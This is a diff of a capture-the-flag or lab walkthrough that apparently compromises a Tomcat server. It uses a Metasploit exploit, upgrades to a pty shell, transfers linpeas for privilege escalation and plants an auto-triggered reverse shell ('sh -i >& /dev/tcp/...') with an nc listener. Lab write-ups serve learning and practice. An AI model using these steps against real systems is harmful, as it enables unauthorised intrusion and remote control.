@@ -38,14 +38,8 @@ Search Metasploit for any tomcat exploits that require credentials (use 5th one)
 
 Set these options
 
-and run!
-
-Exploring some files:  
+and run!  
 ![](media/d94b87382e4b9cbffaf12ec9f99dfa62.png)
-
-![](media/19d0b7d973b678d3fed2331b907c29d4.png)
-
-Download both rsa files so we can access ssh using the keys
 
 Type ‘shell’ in meterpreter shell to go to command shell
 
@@ -53,7 +47,7 @@ Then get an interactive shell using python3 -c ‘import pty; pty.spawn(“/bin/
 
 Look for writable directories: find / -type d -writable 2\> /dev/null
 
-Download linpeas from kali to target using the classic python SimpleHTTPServer
+Download linpeas from kali to target using the classic python SimpleHTTPServer method
 
 ![Text Description automatically generated](media/69032351b93fdf768a617e348e7bb09e.png)
 
@@ -76,6 +70,4 @@ sh -i \>& /dev/tcp/192.168.50.5/4443 0\>&1
 
 Which will create a reverse shell onto our machine on port 4443 (since 4444 is used by Metasploit)
 
-Run nc -nlvp 4443 on kali to listen and wait until the script triggers automatically
-
-![](media/e014c07c410df5d705c1dbe8158d32b9.png)
+![](media/e014c07c410df5d705c1dbe8158d32b9.png)Run nc -nlvp 4443 on kali to listen and wait until the script triggers automatically
